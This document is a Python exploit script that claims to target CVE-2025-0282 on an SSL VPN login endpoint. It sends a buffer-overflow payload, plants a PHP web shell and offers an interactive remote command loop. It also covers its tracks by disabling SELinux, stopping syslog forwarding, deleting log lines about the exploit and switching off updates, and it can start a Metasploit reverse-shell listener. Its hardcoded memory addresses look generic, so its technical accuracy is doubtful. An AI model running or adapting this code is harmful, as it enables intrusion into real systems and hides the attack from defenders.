#####################################################################################################################################################################
# Python script to fuzz and exploit CVE-2025-0282, and possibly other systems. By 41ph4-01 23/04/2024 & our community. 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the       
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, # and to permit persons to whom the Software is furnished to do
# so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#####################################################################################################################################################################

import requests
import sys
import struct
import socket
import ssl
import urllib3
import time
import argparse
import threading
import subprocess

# Banner
def display_splash_screen():
    splash = r"""

_____________   _______________         _______________  ________  .________         _______  ________   ______ ________                _____  ______________  ___ ___    _____           _______  ____ 
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \ \_____  \ |   ____/         \   _  \ \_____  \ /  __  \\_____  \              /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \ /  ____/ |____  \   ______ /  /_\  \ /  ____/ >      < /  ____/    ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
\     \____\     /   |        \ /_____/ /       \  \_/   |       \ /       \ /_____/ \  \_/   |       \/   --   |       \   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 \______  / \___/   /_______  /         \_______ \_____  |_______ |______  /          \_____  |_______ \______  |_______ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
        \/                  \/                  \/     \/        \/      \/                 \/        \/      \/        \/                |__|                      \/      |__|                 \/     



                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |
    
"""
    print(splash)
    print("CVE-2025-0282 - 41PH4-01 & Our Community\n")

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_exploit_payload(command, offset=500, system_address=0x0804a360, command_address=0x0804b008):
    payload = b"A" * offset  # Fill the buffer
    payload += struct.pack("<I", system_address)  # Overwrite return address with system()
    payload += b"BBBB"  # Fake return address
    payload += struct.pack("<I", command_address)  # Address of the command
    payload += command.encode()  # Command to execute
    return payload

def send_payload(target_ip, payload):
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)

        ssl_sock.connect((target_ip, 443))
        print(f"[+] Connected to {target_ip} on port 443 (HTTPS).")

        exploit_endpoint = "/dana-na/auth/url_default/welcome.cgi"
        http_request = (
            f"POST {exploit_endpoint} HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"Content-Length: {len(payload)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"\r\n"
        ).encode() + payload

        ssl_sock.send(http_request)
        response = ssl_sock.recv(4096)
        ssl_sock.close()
        return response.decode(errors="replace")

    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return None

def exploit_vulnerability(target_ip, command):
    payload = create_exploit_payload(command)
    response = send_payload(target_ip, payload)
    if response:
        print("[+] Payload sent successfully.")
    else:
        print("[-] No response received.")

def upload_web_shell(target_ip, local_shell_path):
    try:
        with open(local_shell_path, "r") as f:
            web_shell_content = f.read()

        command = f"echo '{web_shell_content}' > /shell.php"
        exploit_vulnerability(target_ip, command)
        print("[+] Web shell uploaded successfully at /shell.php.")
        verify_shell(target_ip)

    except Exception as e:
        print(f"[-] Error uploading web shell: {e}")

def verify_shell(target_ip):
    shell_url = f"http://{target_ip}/shell.php"
    try:
        response = requests.get(shell_url, verify=False, timeout=10)
        if response.status_code == 200:
            print("[+] Web shell is accessible.")
        else:
            print(f"[-] Web shell is not accessible. HTTP status: {response.status_code}")
    except Exception as e:
        print(f"[-] Error verifying web shell: {e}")

def execute_shell_command(target_ip, command):
    shell_url = f"http://{target_ip}/shell.php"
    try:
        response = requests.post(shell_url, data={"cmd": command}, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+] Command output:\n{response.text.strip()}")
        else:
            print(f"[-] Failed to execute command via shell. HTTP status: {response.status_code}")
    except Exception as e:
        print(f"[-] Error executing command via web shell: {e}")

def disable_selinux(target_ip):
    command = "setenforce 0"
    execute_shell_command(target_ip, command)
    print("[+] SELinux disabled.")

def prevent_syslog_forwarding(target_ip):
    command = "sed -i '/^*.* @/d' /etc/rsyslog.conf"
    execute_shell_command(target_ip, command)
    command = "systemctl restart rsyslog"
    execute_shell_command(target_ip, command)
    print("[+] Syslog forwarding disabled.")

def remount_drive_rw(target_ip):
    command = "mount -o remount,rw /"
    execute_shell_command(target_ip, command)
    print("[+] Drive remounted as read-write.")

def remove_log_entries(target_ip):
    command = "sed -i '/CVE-2025-0282/d' /var/log/*"
    execute_shell_command(target_ip, command)
    print("[+] Log entries related to the exploit removed.")

def enable_selinux(target_ip):
    command = "setenforce 1"
    execute_shell_command(target_ip, command)
    print("[+] SELinux re-enabled.")

def remount_drive_ro(target_ip):
    command = "mount -o remount,ro /"
    execute_shell_command(target_ip, command)
    print("[+] Drive remounted as read-only.")

def disable_updates(target_ip):
    commands = [
        "systemctl stop apt-daily.service",
        "systemctl disable apt-daily.service"
    ]
    for command in commands:
        execute_shell_command(target_ip, command)
    print("[+] System updates disabled successfully.")

def start_metasploit_listener(lhost, lport):
    """ Start a Metasploit multi-handler to listen for reverse connections. """
    print(f"[+] Starting Metasploit listener on {lhost}:{lport}")
    metasploit_cmd = [
        "msfconsole", "-q", "-x", f"use exploit/multi/handler; set PAYLOAD linux/x86/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run"
    ]
    subprocess.run(metasploit_cmd)

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-0282 Exploit Automation Script")
    parser.add_argument("target_ip", help="IP address of the target system")
    parser.add_argument("local_shell_path", help="Path to the local web shell to upload")
    parser.add_argument("--poc", action="store_true", help="Use POC exploit instead of custom command")
    parser.add_argument("--listener", action="store_true", help="Start Metasploit listener for reverse shell")
    parser.add_argument("--lhost", help="Local host for reverse shell", default="0.0.0.0")
    parser.add_argument("--lport", help="Local port for reverse shell", type=int, default=4444)
    args = parser.parse_args()

    if args.listener:
        listener_thread = threading.Thread(target=start_metasploit_listener, args=(args.lhost, args.lport))
        listener_thread.daemon = True
        listener_thread.start()

    if args.poc:
        command = "echo 'POC command' > /shell.php"
    else:
        command = input("Enter custom command to execute on target: ")

    upload_web_shell(args.target_ip, args.local_shell_path)

    disable_selinux(args.target_ip)
    prevent_syslog_forwarding(args.target_ip)
    remount_drive_rw(args.target_ip)
    remove_log_entries(args.target_ip)
    enable_selinux(args.target_ip)
    remount_drive_ro(args.target_ip)

    while True:
        command = input("Enter command to execute on the target (or 'exit' to quit): ")
        if command.lower() == "exit":
            print("Exiting...")
            break

        execute_shell_command(args.target_ip, command)

if __name__ == "__main__":
    main()
